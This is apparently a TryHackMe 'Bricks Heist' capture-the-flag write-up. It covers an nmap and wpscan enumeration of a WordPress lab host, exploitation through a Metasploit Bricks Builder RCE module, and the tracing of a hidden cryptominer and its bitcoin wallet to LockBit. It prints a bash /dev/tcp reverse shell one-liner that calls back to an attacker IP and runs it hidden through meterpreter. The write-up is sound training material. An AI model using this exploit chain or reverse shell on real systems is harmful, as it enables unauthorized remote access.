# THM-Bricks-Heist-Easy
Try Hack Me Write Up 


Hack the 
tags:na so far 

# nmap


First were gonna run nmap to scan the ip address

`sudo nmap -T4 -p- -A -oN nmap.txt 10.66.175.64`


First were gonna run nmap to scan the ip address

`nmap -T4 -p- -A -oN nmap.txt <ip address>`


```
Nmap scan report for bricks.thm (10.66.175.64)
Host is up (0.00073s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Sat, 14 Mar 2026 18:05:49 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Sat, 14 Mar 2026 18:05:49 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
443/tcp  open  ssl/http Apache httpd
|_http-generator: WordPress 6.5
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache
|_http-title: Brick by Brick
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
| tls-alpn: 
|   h2
|_  http/1.1
3306/tcp open  mysql    MySQL (unauth1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```



The scan reveals a few key insights:


* Port 80 is running a Python HTTP server.

* Port 443 is running an Apache server with WordPress 6.5 installed.

* MySQL (port 3306) is accessible but requires authentication.

* The /wp-admin/ page in robots.txt suggests a WordPress-based site.


## wpscan

now we try to enumerate with wpscan 
something like this i tried for the first time 

`wpscan --url https://bricks.thm`


<img width="1881" height="698" alt="Image" src="https://github.com/user-attachments/assets/5ed02d98-8b91-40cc-a0ab-c1b5668f7126" />


We get an error but after doing some research all we have to do it 

`wpscan --url https://bricks.thm --disable-tls-checks`


And make sure to run wpscan --update...

```
WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
```

We get some important thing but this stands out to me because after looking up wordpress 6.5 vulnerabilities

<img width="807" height="728" alt="Image" src="https://github.com/user-attachments/assets/d2af5cab-b235-4e1a-9642-6368d971543c" />


This seems really intersting to me...


lets go on metasploit

[Rapid7](https://www.rapid7.com/db/modules/exploit/multi/http/wp_bricks_builder_rce/)

Looks like we foind this online too from the website 

```
    msf > use exploit/multi/http/wp_bricks_builder_rce
    msf exploit(wp_bricks_builder_rce) > show targets
        ...targets...
    msf exploit(wp_bricks_builder_rce) > set TARGET < target-id >
    msf exploit(wp_bricks_builder_rce) > show options
        ...show and set options...
    msf exploit(wp_bricks_builder_rce) > exploit
```

Lets try it ourselves

remeber also once we show options we now now that we have to set lhost and Rhost...

<img width="1191" height="442" alt="Image" src="https://github.com/user-attachments/assets/5cbfde4e-b50d-4ece-920c-0f0ad0853c15" />

And bam meterpreter opened

Now lets look at the questions...

### What is the content of the hidden .txt file in the web folder?
alright lets start searching for it...

so after trying meterpreters 

`search hiddenfile.txt`

didn't works, rarley works for me... I tried opening a shell but that didn't work also, kept getting timed out here was the out put

```
meterpreter > shell

[*] 10.66.175.64 - Meterpreter session 2 closed.  Reason: Died
ls
[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>
msf6 exploit(multi/http/wp_bricks_builder_rce) > ls
[*] exec: ls

burp.json   Desktop    Instructions  Pictures  Rooms	snap		   Tools
CTFBuilder  Downloads  nmap.txt      Postman   Scripts	thinclient_drives
msf6 exploit(multi/http/wp_bricks_builder_rce) > 
```

So we go to [revshells](https://www.revshells.com/) to help build us a reverse shell.

<img width="1142" height="661" alt="Image" src="https://github.com/user-attachments/assets/22cc2d44-0577-4674-9970-5ff8c2178b28" />


We'll buse bash 196 

```
from revshells

0<&196;exec 196<>/dev/tcp/10.66.125.108/5555; sh <&196 >&196 2>&196



In Meterpreter


execute -f /bin/bash -a "-c '0<&196;exec 196<>/dev/tcp/10.66.125.108/5555; sh <&196 >&196 2>&196'" -H

execute -f /bin/bash -a "revshell command"  -H
```



**Why `execute -f /bin/bash -a "..." -H`:**

- `-f /bin/bash` — the binary to run
- `-a "..."` — the arguments/command to pass to bash
- `-H` — run it **hidden** in the background so meterpreter doesn't wait for it and die

-c tells bash to execute a string as a command.


For some reason rev shell command wasnt working so I jus went back to the meterpreter and I found the hidden txt fill we so got the first answer...

### What is the name of the suspicious process?

My first though was ps but there is just so many I don't feel like trying to find it that way...

After doing some snooping, in the wp-config file there are hard coded secrets...



Any ways... 


To find more running processes we can use systemctl 


`systemctl list-units --type=service --state=running`

Boom we found it 

```  ubuntu.service                                 loaded active running TRYHACK3M   ```

```Shell> systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target

Shell> 
Error: shell_exec(): Argument #1 ($command) cannot be empty
Shell> ```


nice


```What is the name of the suspicious process?

nm-inet-dialog


What is the service name affiliated with the suspicious process?

ubuntu.service```


Now we have ### What is the log file name of the miner instance?

After digging deeper we can see the inet.conf which is the answer to this

<img width="463" height="357" alt="Image" src="https://github.com/user-attachments/assets/e82dd238-c792-4631-be64-ce533043e51d" />


## What is the wallet address of the miner instance?

## The wallet address used has been involved in transactions between wallets belonging to which threat group?

Now we can look more into each of these files...



<img width="818" height="496" alt="Image" src="https://github.com/user-attachments/assets/3fe06cb5-03a9-4d9b-96df-c317dc44af81" />

We can do some more digging into the ID by going to cyberchef


<img width="1537" height="586" alt="Image" src="https://github.com/user-attachments/assets/59484be9-9f2f-4c36-9797-589b4b1982c9" />



We can see from hex it has the = sign so we can use that for the base64...

ok so now we got 'YmMxcXlrNzlmY3A5aGQ1a3JlcHJjZTg5dGtoNHdydGw4YXZ0NGw2N3FhYmMxcXlrNzlmY3A5aGFkNWtyZXByY2U4OXRraDR3cnRsOGF2dDRsNjdxYQ==' lets go to a bitcoin wallet finder...


Ok turns out we had to do base64 twice and it gives us this

```bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa```


which is two wallets

```bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa
bc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa```



<img width="1261" height="861" alt="Image" src="https://github.com/user-attachments/assets/94f7ff0b-8df2-458a-a1d4-877f698e7ca6" />

First one worked but I couldnt find anything online about threat group...

<img width="1149" height="570" alt="Image" src="https://github.com/user-attachments/assets/c2dd5c9e-a060-4270-a75c-4fdddf8ba628" />

Until I came accross this address

<img width="855" height="397" alt="Image" src="https://github.com/user-attachments/assets/a45780e1-bba8-4df5-a95e-18a7e39283dd" />

Lockbit

